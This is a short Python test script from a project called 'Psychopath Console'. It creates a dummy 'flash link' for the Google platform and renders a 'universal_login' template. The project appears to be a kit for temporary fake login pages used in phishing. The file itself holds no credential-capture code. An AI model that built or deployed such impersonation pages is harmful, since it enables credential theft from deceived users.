"""
Psychopath Console - Flash Verification Utility
Author: chadi0x (https://github.com/chadi0x)
License: Educational & Research Purposes Only
"""
import sys
import os
from datetime import datetime, timedelta

# Mock App Context
from app import app, db, FlashLink, FLASH_PLATFORMS

def test_flash_creation():
    print("Testing Flash Link Logic...")
    with app.app_context():
        # Create Dummy
        f = FlashLink(
            id="test-123",
            platform="google",
            language="en",
            scenario="group",
            redirect_url="http://x.com",
            expires_at=datetime.utcnow() + timedelta(hours=1)
        )
        # Don't commit to DB to avoid polluting, just check object
        
        # Check Config
        p_config = FLASH_PLATFORMS.get(f.platform)
        print(f"Platform Config: {p_config}")
        
        if not p_config:
            print("ERROR: Platform config missing!")
            return
            
        # Try Template Render (Render string to see if internal logic breaks)
        # We can't easily full render without request context or db session if template uses them
        # But we can check if file logic works.
        try:
            from flask import render_template
            # We need a request context for 'url_for' or 'request' usage in template
            with app.test_request_context():
                output = render_template('flash/universal_login.html', link=f, p_config=p_config)
                print("Template Render: SUCCESS")
                print(f"Output Length: {len(output)}")
        except Exception as e:
            print(f"Template Render FAILED: {e}")

if __name__ == "__main__":
    test_flash_creation()
